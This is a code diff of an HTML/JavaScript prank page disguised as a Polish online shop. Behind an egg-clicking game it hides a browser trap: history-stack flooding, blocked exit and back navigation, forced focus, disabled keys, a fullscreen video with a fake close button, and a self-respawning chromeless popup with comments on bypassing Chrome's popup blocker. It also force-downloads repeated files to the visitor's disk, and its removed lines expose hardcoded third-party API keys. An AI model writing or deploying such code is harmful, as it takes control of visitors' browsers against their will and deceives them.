@@ -3,53 +3,61 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Sklep Cha&#322;ki</title>
+  <title>Sklep Chałki</title>
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body { font-family: 'Segoe UI', sans-serif; background: #f5f0e8; min-height: 100vh; user-select: none; }
-    header { background: #8B4513; color: #fff; padding: 18px 40px; font-size: 1.8rem; font-weight: bold; letter-spacing: 1px; }
-    header span { font-size: 1rem; font-weight: normal; opacity: 0.8; margin-left: 12px; }
-    .shop { display: flex; gap: 32px; justify-content: center; padding: 60px 20px; flex-wrap: wrap; }
-    .card { background: #fff; border-radius: 16px; box-shadow: 0 4px 18px rgba(0,0,0,.10); width: 240px; padding: 28px 20px 22px; display: flex; flex-direction: column; align-items: center; gap: 14px; transition: transform .15s; }
-    .card:hover { transform: translateY(-4px); }
-    .card-img { width: 120px; height: 140px; object-fit: contain; border-radius: 8px; }
-    .card-img-placeholder { width: 120px; height: 140px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 4rem; }
-    .card h2 { font-size: 1.15rem; color: #333; text-align: center; }
-    .card .price { font-size: 1.4rem; font-weight: bold; color: #8B4513; }
-    .btn { background: #8B4513; color: #fff; border: none; border-radius: 8px; padding: 10px 28px; font-size: 1rem; cursor: pointer; transition: background .15s; }
-    .btn:hover { background: #6b3410; }
-    #overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,.6); z-index: 100; align-items: center; justify-content: center; flex-direction: column; gap: 24px; }
-    #overlay.active { display: flex; }
-    #msg-paczka { background: #fff; border-radius: 20px; padding: 48px 64px; font-size: 2rem; font-weight: bold; color: #333; text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,.25); }
-    #egg-game { display: flex; flex-direction: column; align-items: center; gap: 20px; }
-    #egg-container { cursor: pointer; user-select: none; width: 260px; height: 300px; display: flex; align-items: center; justify-content: center; }
-    #egg-img { width: 220px; height: 260px; object-fit: contain; transform-origin: center bottom; }
-    #egg-hint { color: #fff; font-size: 1.1rem; opacity: .85; text-align: center; }
-    #click-count { color: #ffd700; font-size: 1rem; }
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:'Segoe UI',sans-serif;background:#f5f0e8;min-height:100vh;user-select:none}
+    header{background:#8B4513;color:#fff;padding:18px 40px;font-size:1.8rem;font-weight:bold;letter-spacing:1px}
+    header span{font-size:1rem;font-weight:normal;opacity:.8;margin-left:12px}
+    .shop{display:flex;gap:32px;justify-content:center;padding:60px 20px;flex-wrap:wrap}
+    .card{background:#fff;border-radius:16px;box-shadow:0 4px 18px rgba(0,0,0,.1);width:240px;padding:28px 20px 22px;display:flex;flex-direction:column;align-items:center;gap:14px;transition:transform .15s}
+    .card:hover{transform:translateY(-4px)}
+    .card-img{width:120px;height:140px;object-fit:contain;border-radius:8px}
+    .card-img-placeholder{width:120px;height:140px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:4rem}
+    .card h2{font-size:1.15rem;color:#333;text-align:center}
+    .card .price{font-size:1.4rem;font-weight:bold;color:#8B4513}
+    .btn{background:#8B4513;color:#fff;border:none;border-radius:8px;padding:10px 28px;font-size:1rem;cursor:pointer;transition:background .15s}
+    .btn:hover{background:#6b3410}
 
-    /* PULAPKA WIDEO */
-    #video-trap { display: none; position: fixed; inset: 0; background: #000; z-index: 99999; align-items: center; justify-content: center; }
-    #video-trap.active { display: flex; }
-    #trap-video { width: 100vw; height: 100vh; object-fit: cover; display: block; }
-    #trap-msg { position: fixed; bottom: 56px; left: 50%; transform: translateX(-50%); color: #fff; font-size: 1.6rem; font-weight: bold; text-shadow: 2px 2px 12px #000; animation: pulse 1s ease-in-out infinite; pointer-events: none; white-space: nowrap; z-index: 100001; }
-    #fake-close { position: fixed; top: 14px; right: 18px; background: rgba(255,255,255,.15); color: #fff; border: 2px solid rgba(255,255,255,.4); border-radius: 6px; padding: 6px 14px; font-size: .85rem; cursor: pointer; z-index: 100001; }
-    @keyframes pulse { 0%,100%{opacity:1;transform:translateX(-50%) scale(1)} 50%{opacity:.5;transform:translateX(-50%) scale(1.05)} }
+    /* Overlay / egg game */
+    #overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:100;align-items:center;justify-content:center;flex-direction:column;gap:24px}
+    #overlay.active{display:flex}
+    #msg-paczka{background:#fff;border-radius:20px;padding:48px 64px;font-size:2rem;font-weight:bold;color:#333;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,.25)}
+    #egg-game{display:flex;flex-direction:column;align-items:center;gap:20px}
+    #egg-container{cursor:pointer;user-select:none;width:260px;height:300px;display:flex;align-items:center;justify-content:center}
+    #egg-img{width:220px;height:260px;object-fit:contain;transform-origin:center bottom}
+    #egg-hint{color:#fff;font-size:1.1rem;opacity:.85;text-align:center}
+    #click-count{color:#ffd700;font-size:1rem}
 
-    /* EKRAN POWROTU */
-    #return-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 199999; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; gap: 24px; }
-    #return-screen.show { display: flex; }
-    #return-screen .rtxt { color: #ff0000; font-size: clamp(2rem,6vw,5rem); font-weight: 900; text-align: center; animation: blink .4s step-end infinite; line-height: 1.2; }
-    #return-screen .rsub { color: #fff; font-size: 1.2rem; opacity: .7; }
-    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+    /* Video trap */
+    #video-trap{display:none;position:fixed;inset:0;background:#000;z-index:99999;align-items:center;justify-content:center}
+    #video-trap.active{display:flex}
+    #trap-video{width:100vw;height:100vh;object-fit:cover}
+    #trap-msg{position:fixed;bottom:56px;left:50%;transform:translateX(-50%);color:#fff;font-size:1.6rem;font-weight:bold;text-shadow:2px 2px 12px #000;animation:pulse 1s ease-in-out infinite;pointer-events:none;white-space:nowrap;z-index:100001}
+    #fake-close{position:fixed;top:14px;right:18px;background:rgba(255,255,255,.15);color:#fff;border:2px solid rgba(255,255,255,.4);border-radius:6px;padding:6px 14px;font-size:.85rem;cursor:pointer;z-index:100001}
+    @keyframes pulse{0%,100%{opacity:1;transform:translateX(-50%) scale(1)}50%{opacity:.5;transform:translateX(-50%) scale(1.05)}}
 
-    /* ANIMACJE JAJKA */
+    /* Return screen (po wyjsciu z fullscreen) */
+    #return-screen{display:none;position:fixed;inset:0;background:#000;z-index:199999;flex-direction:column;align-items:center;justify-content:center;cursor:pointer;gap:24px}
+    #return-screen.show{display:flex}
+    #return-screen .rtxt{color:#f00;font-size:clamp(2rem,6vw,5rem);font-weight:900;text-align:center;animation:blink .4s step-end infinite;line-height:1.2}
+    #return-screen .rsub{color:#fff;font-size:1.2rem;opacity:.7}
+    @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+
+    /* Trap mode - ukryj sklep */
+    body.trap-mode>header,
+    body.trap-mode>.shop,
+    body.trap-mode>#ketchup-layer,
+    body.trap-mode>#overlay{display:none!important}
+
+    /* Animacje jajka */
     @keyframes shake-light{0%,100%{transform:rotate(0)}20%{transform:rotate(-6deg)}40%{transform:rotate(6deg)}60%{transform:rotate(-4deg)}80%{transform:rotate(4deg)}}
     @keyframes shake-medium{0%,100%{transform:rotate(0) translateX(0)}15%{transform:rotate(-10deg) translateX(-6px)}30%{transform:rotate(10deg) translateX(6px)}45%{transform:rotate(-8deg) translateX(-4px)}60%{transform:rotate(8deg) translateX(4px)}75%{transform:rotate(-5deg) translateX(-2px)}90%{transform:rotate(5deg) translateX(2px)}}
     @keyframes shake-hard{0%,100%{transform:rotate(0) translate(0,0)}10%{transform:rotate(-15deg) translate(-10px,-4px)}20%{transform:rotate(15deg) translate(10px,4px)}30%{transform:rotate(-12deg) translate(-8px,-3px)}40%{transform:rotate(12deg) translate(8px,3px)}50%{transform:rotate(-18deg) translate(-12px,-5px)}60%{transform:rotate(18deg) translate(12px,5px)}70%{transform:rotate(-10deg) translate(-6px,-2px)}80%{transform:rotate(10deg) translate(6px,2px)}90%{transform:rotate(-8deg) translate(-4px,-1px)}}
     @keyframes hatch-out{0%{transform:scale(1) rotate(0);opacity:1}30%{transform:scale(1.3) rotate(-20deg);opacity:1}60%{transform:scale(1.5) rotate(20deg);opacity:.7}100%{transform:scale(0) rotate(45deg);opacity:0}}
     .shake-light{animation:shake-light .35s ease}.shake-medium{animation:shake-medium .35s ease}.shake-hard{animation:shake-hard .35s ease}.hatch-out{animation:hatch-out .6s ease forwards}
 
-    /* KETCHUP */
+    /* Ketchup */
     #ketchup-layer{display:none;position:fixed;inset:0;pointer-events:none;z-index:200;overflow:hidden}
     #ketchup-bottle{position:absolute;bottom:10%;left:-160px;font-size:8rem;line-height:1;transition:left .8s cubic-bezier(.22,1,.36,1);filter:drop-shadow(4px 4px 8px rgba(0,0,0,.4))}
     #ketchup-bottle.slide-in{left:40px}#ketchup-bottle.slide-out{left:-160px}
@@ -115,7 +123,6 @@
   <button id="fake-close">Zamknij [X]</button>
 </div>
 
-<!-- Return screen -->
 <div id="return-screen" onclick="returnToFullscreen()">
   <div class="rtxt">&#128683; ZOSTAŃ! &#128683;<br>KLIKNIJ ŻEBY WRÓCIĆ</div>
   <div class="rsub">(nie możesz stąd wyjść)</div>
@@ -125,16 +132,18 @@
 (function(){
 'use strict';
 
-// ============================================================
-// BLOKADA WYJSCIA
-// ============================================================
+var IS_TRAP = /[?&]trap/.test(location.search);
+var trapActive = false;
+var wasFS = false;
+var trapPopup = null;
+var popupMonitor = null;
 
-history.pushState(null, null, location.href);
-setInterval(function(){ history.pushState(null,null,location.href); }, 100);
-window.addEventListener('popstate', function(){
-  history.pushState(null,null,location.href);
-  tryClone();
-});
+// ============================================================
+// BLOKADA WYJSCIA (dziala w obu trybach)
+// ============================================================
+history.pushState(null,null,location.href);
+setInterval(function(){ history.pushState(null,null,location.href); },100);
+window.addEventListener('popstate',function(){ history.pushState(null,null,location.href); tryClone(); });
 try{ history.back=history.forward=history.go=function(){ history.pushState(null,null,location.href); }; }catch(e){}
 
 function tryClone(){
@@ -143,16 +152,19 @@ function tryClone(){
 
 window.addEventListener('beforeunload',function(e){
   e.preventDefault(); e.returnValue='';
-  tryClone();
+  // Jesli popup zamkniety - otworz nowy (glowne okno)
+  if(!IS_TRAP && (!trapPopup || trapPopup.closed)){
+    try{ openTrapPopup(); }catch(e){}
+  }
   return '';
 });
 
 document.addEventListener('visibilitychange',function(){
-  if(document.hidden){ tryClone(); }
+  if(document.hidden) tryClone();
   try{ window.focus(); }catch(e){}
 });
 
-setInterval(function(){ try{ window.focus(); }catch(e){}; },100);
+setInterval(function(){ try{window.focus();}catch(e){}; },100);
 window.addEventListener('blur',function(){ setTimeout(function(){ try{window.focus();}catch(e){}; },10); });
 
 document.addEventListener('contextmenu',function(e){ e.preventDefault(); e.stopPropagation(); return false; },true);
@@ -172,19 +184,13 @@ document.addEventListener('keydown',function(e){
 },true);
 
 // ============================================================
-// FULLSCREEN MONITORING - NATYCHMIASTE
+// FULLSCREEN
 // ============================================================
-var trapActive=false;
-var wasFS=false;
-
 function reqFS(el){
   var fn=el.requestFullscreen||el.webkitRequestFullscreen||el.mozRequestFullScreen;
-  if(fn&&!document.fullscreenElement){ fn.call(el).catch(function(){}); }
+  if(fn&&!document.fullscreenElement) fn.call(el).catch(function(){});
 }
-
-function isInFS(){
-  return !!(document.fullscreenElement||document.webkitFullscreenElement||document.mozFullScreenElement);
-}
+function isInFS(){ return !!(document.fullscreenElement||document.webkitFullscreenElement); }
 
 setInterval(function(){
   if(!trapActive) return;
@@ -202,7 +208,43 @@ window.returnToFullscreen=function(){
 };
 
 // ============================================================
-// POBIERANIE ZDJEC
+// POPUP TRICK (styl ptoszek.pl)
+// Otworz chromeless popup bez paska adresu.
+// Glowne okno monitoruje popup i otwiera nowy gdy ten sie zamknie.
+// ============================================================
+function openTrapPopup(){
+  if(IS_TRAP) return; // popup nie otwiera kolejnych popupow
+  var url=location.href.split('?')[0]+'?trap=1';
+  var f=[
+    'width='+screen.availWidth,
+    'height='+screen.availHeight,
+    'top=0','left=0',
+    'toolbar=no','menubar=no','location=no',
+    'status=no','scrollbars=no','resizable=no'
+  ].join(',');
+  var w=window.open(url,'chalki_trap',f);
+  if(!w){ tryClone(); return; } // zablokowany - otwieramy zwykla karte
+  try{ w.moveTo(0,0); w.resizeTo(screen.availWidth,screen.availHeight); }catch(e){}
+  trapPopup=w;
+  // Monitoruj popup - gdy zamkniety otworz nowy
+  if(popupMonitor) clearInterval(popupMonitor);
+  popupMonitor=setInterval(function(){
+    if(trapPopup&&trapPopup.closed){
+      clearInterval(popupMonitor);
+      // Proby odtworzenia popupu (moze byc zablokowane w Chrome bez gestu)
+      try{ openTrapPopup(); }catch(e){
+        // Fallback: nowa zwykla karta
+        try{ window.open(url,'_blank'); }catch(e2){}
+      }
+    }
+  },300);
+}
+
+// ============================================================
+// POBIERANIE ZDJEC ZWIERZAKOW
+// psy: labrador (brazowy), chihuahua, jamnik
+// koty: brytyjski krotkowlosy (bsho)
+// ptaki: zeberki (zebra finch) z Wikimedia
 // ============================================================
 async function blobDownload(imgUrl,filename){
   try{
@@ -218,14 +260,15 @@ async function blobDownload(imgUrl,filename){
 }
 
 async function grabDog(n){
-  var breeds=['retriever-brown','chihuahua','dachshund'];
-  var breed=breeds[n%breeds.length];
+  // Rotacja: labrador (brazowy), chihuahua, jamnik
+  var breeds=['labrador','chihuahua','dachshund'];
+  var breed=breeds[n%3];
   try{
     var r=await fetch('https://dog.ceo/api/breed/'+breed+'/images/random');
     var d=await r.json();
     if(!d.message) throw 0;
-    var ext=(d.message.split('.').pop().split('?')[0]||'jpg').substring(0,4);
-    await blobDownload(d.message,'piesek_'+n+'.'+ext);
+    var ext=(d.message.split('.').pop().split('?')[0]||'jpg').slice(0,4);
+    await blobDownload(d.message,'piesek_'+breed+'_'+n+'.'+ext);
   }catch(e){}
 }
 
@@ -235,36 +278,29 @@ async function grabCat(n){
     var d=await r.json();
     var url=d&&d[0]&&d[0].url;
     if(!url) throw 0;
-    var ext=(url.split('.').pop().split('?')[0]||'jpg').substring(0,4);
+    var ext=(url.split('.').pop().split('?')[0]||'jpg').slice(0,4);
     await blobDownload(url,'kot_brytyjski_'+n+'.'+ext);
   }catch(e){
-    try{
-      var r2=await fetch('https://cataas.com/cat?json=true');
-      var d2=await r2.json();
-      if(d2._id) await blobDownload('https://cataas.com/cat/'+d2._id,'kot_'+n+'.jpg');
-    }catch(e2){}
+    try{ await blobDownload('https://cataas.com/cat?t='+Date.now(),'kot_'+n+'.jpg'); }catch(e2){}
   }
 }
 
 async function grabBird(n){
+  // Zeberki (Zebra Finch) z Wikipedia Wikimedia API - ma CORS
   try{
-    var r=await fetch('https://api.unsplash.com/search/photos?query=zebra+finch&client_id=0P_tGhH5xA1l_DsAjOV7oNPDKH2opjXZH8g9wqQBqEA');
+    var r=await fetch('https://en.wikipedia.org/api/rest_v1/page/media-list/Zebra_finch');
     var d=await r.json();
-    if(!d.results||!d.results.length) throw 0;
-    var url=d.results[Math.floor(Math.random()*d.results.length)].urls.regular;
-    var ext=(url.split('.').pop().split('?')[0]||'jpg').substring(0,4);
+    var items=(d.items||[]).filter(function(i){
+      return i.type==='image'&&i.srcset&&i.srcset.length&&
+             !/svg/.test((i.srcset[0].src||''));
+    });
+    if(!items.length) throw 0;
+    var item=items[n%items.length];
+    var src=item.srcset[item.srcset.length-1].src;
+    var url=src.startsWith('//')?'https:'+src:src;
+    var ext=(url.split('.').pop().split('?')[0]||'jpg').slice(0,4);
     await blobDownload(url,'zebra_finch_'+n+'.'+ext);
-  }catch(e){
-    try{
-      var r2=await fetch('https://pixabay.com/api/?key=47303356-23bcd68e5be8c8b61be6cbce5&q=zebra+finch&image_type=photo&per_page=1&order=latest');
-      var d2=await r2.json();
-      if(d2.hits&&d2.hits.length){
-        var url2=d2.hits[0].webformatURL;
-        var ext2=(url2.split('.').pop().split('?')[0]||'jpg').substring(0,4);
-        await blobDownload(url2,'zebra_finch_'+n+'.'+ext2);
-      }
-    }catch(e2){}
-  }
+  }catch(e){}
 }
 
 function startPetBombing(){
@@ -274,8 +310,35 @@ function startPetBombing(){
       if(type==='dog') grabDog(i+1);
       else if(type==='cat') grabCat(i+1);
       else grabBird(i+1);
-    }, i*1500+600);
+    },i*1500+600);
   });
+}
+
+// ============================================================
+// AKTYWACJA PULAPKI (wideo + fullscreen)
+// ============================================================
+function activateTrap(){
+  trapActive=true; wasFS=false;
+  document.getElementById('overlay').classList.remove('active');
+  document.getElementById('egg-game').style.display='none';
+  var trap=document.getElementById('video-trap');
+  trap.classList.add('active');
+  document.getElementById('trap-video').play().catch(function(){});
+  reqFS(trap);
+  startPetBombing();
+}
+
+// ============================================================
+// TRYB POPUP (?trap=1) - pokaz wideo od razu, bez sklepu
+// ============================================================
+if(IS_TRAP){
+  document.body.classList.add('trap-mode');
+  // Uruchom pulapke po zaladowaniu DOM
+  if(document.readyState==='loading'){
+    document.addEventListener('DOMContentLoaded',activateTrap);
+  } else {
+    activateTrap();
+  }
 }
 
 // ============================================================
@@ -300,7 +363,6 @@ fakeBtn.addEventListener('click',function(){
 // SKLEP
 // ============================================================
 var ketchupTO=null;
-
 window.buySimple=function(){
   document.getElementById('overlay').classList.add('active');
   document.getElementById('msg-paczka').style.display='block';
@@ -316,10 +378,15 @@ function launchKetchupAttack(){
   var L=document.getElementById('ketchup-layer'),B=document.getElementById('ketchup-bottle');
   L.style.display='block'; L.classList.remove('fade-out');
   requestAnimationFrame(function(){ requestAnimationFrame(function(){ B.classList.add('slide-in'); }); });
-  setTimeout(function(){ for(var i=0;i<12;i++)(function(x){ setTimeout(function(){ throwTomato(L,B); },x*280); })(i); },900);
+  setTimeout(function(){
+    for(var i=0;i<12;i++)(function(x){ setTimeout(function(){ throwTomato(L,B); },x*280); })(i);
+  },900);
   setTimeout(function(){
     B.classList.remove('slide-in'); B.classList.add('slide-out'); L.classList.add('fade-out');
-    L.addEventListener('animationend',function(){ L.style.display='none'; L.classList.remove('fade-out'); B.classList.remove('slide-out'); L.querySelectorAll('.tomato-splat,.splat-blob').forEach(function(el){el.remove();}); },{once:true});
+    L.addEventListener('animationend',function(){
+      L.style.display='none'; L.classList.remove('fade-out'); B.classList.remove('slide-out');
+      L.querySelectorAll('.tomato-splat,.splat-blob').forEach(function(el){el.remove();});
+    },{once:true});
   },5900);
 }
 
@@ -331,20 +398,22 @@ function throwTomato(L,B){
   var rot=(Math.random()-.5)*720,dur=(0.55+Math.random()*.35).toFixed(2)+'s',size=(60+Math.random()*50)+'px';
   var sp=document.createElement('div'); sp.className='tomato-splat'; sp.style.cssText='left:'+sx+'px;top:'+sy+'px';
   var fly=document.createElement('span'); fly.textContent='🍅'; fly.className='tomato-fly';
-  fly.style.setProperty('--tx',tx+'px'); fly.style.setProperty('--ty',ty+'px'); fly.style.setProperty('--rot',rot+'deg'); fly.style.setProperty('--dur',dur);
+  fly.style.setProperty('--tx',tx+'px'); fly.style.setProperty('--ty',ty+'px');
+  fly.style.setProperty('--rot',rot+'deg'); fly.style.setProperty('--dur',dur);
   var blob=document.createElement('div'); blob.className='splat-blob';
   blob.style.setProperty('--size',size); blob.style.setProperty('--dur',dur);
   blob.style.cssText+='left:'+(sx+tx-parseFloat(size)/2)+'px;top:'+(sy+ty)+'px;position:absolute';
   for(var d=0;d<2+Math.floor(Math.random()*2);d++){
     var drip=document.createElement('div'); drip.className='drip';
-    drip.style.setProperty('--size',size); drip.style.setProperty('--dur',dur); drip.style.setProperty('--drip-x',(20+Math.random()*60)+'%');
+    drip.style.setProperty('--size',size); drip.style.setProperty('--dur',dur);
+    drip.style.setProperty('--drip-x',(20+Math.random()*60)+'%');
     blob.appendChild(drip);
   }
   sp.appendChild(fly); L.appendChild(sp); L.appendChild(blob);
 }
 
 // ============================================================
-// JAJO
+// GRA JAJKO
 // ============================================================
 var clickCount=0,lastClickTime=0,rapidStreak=0;
 
@@ -365,32 +434,38 @@ window.clickEgg=function(){
   document.getElementById('click-count').textContent='Kliknięcia: '+clickCount+' / 10';
   var egg=document.getElementById('egg-img');
   egg.classList.remove('shake-light','shake-medium','shake-hard','hatch-out');
-  if(clickCount>=10){ egg.classList.add('hatch-out'); egg.addEventListener('animationend',activateTrap,{once:true}); return; }
+
+  if(clickCount>=10){
+    // KLUCZOWE: window.open() wywolany BEZPOSREDNIO z click handlera
+    // = gest uzytkownika = Chrome pozwala na popup
+    openTrapPopup();
+    egg.classList.add('hatch-out');
+    egg.addEventListener('animationend',function(){
+      document.getElementById('overlay').classList.remove('active');
+      document.getElementById('egg-game').style.display='none';
+      // Fallback: aktywuj lokalna pulapke jesli popup zablokowany
+      if(!trapPopup||trapPopup.closed) activateTrap();
+    },{once:true});
+    return;
+  }
+
   void egg.offsetWidth;
   if(rapidStreak>=4){ egg.classList.add('shake-hard'); document.getElementById('egg-hint').textContent='💥 SZALEJE!'; }
   else if(rapidStreak>=2){ egg.classList.add('shake-medium'); document.getElementById('egg-hint').textContent='🔥 Szybciej!'; }
   else{ egg.classList.add('shake-light'); document.getElementById('egg-hint').textContent='Kliknij w jajko, żeby je wykluć!'; }
-  egg.addEventListener('animationend',function(){ egg.classList.remove('shake-light','shake-medium','shake-hard'); },{once:true});
+  egg.addEventListener('animationend',function(){
+    egg.classList.remove('shake-light','shake-medium','shake-hard');
+  },{once:true});
 };
-
-function activateTrap(){
-  trapActive=true;
-  wasFS=false;
-  document.getElementById('overlay').classList.remove('active');
-  document.getElementById('egg-game').style.display='none';
-  var trap=document.getElementById('video-trap');
-  trap.classList.add('active');
-  document.getElementById('trap-video').play().catch(function(){});
-  reqFS(trap);
-  startPetBombing();
-}
 
 window.closeOverlay=function(){
   document.getElementById('overlay').classList.remove('active');
   document.getElementById('msg-paczka').style.display='none';
   document.getElementById('egg-game').style.display='none';
 };
-document.getElementById('overlay').addEventListener('click',function(e){ if(e.target===this) closeOverlay(); });
+document.getElementById('overlay').addEventListener('click',function(e){
+  if(e.target===this) closeOverlay();
+});
 
 })();
 </script>
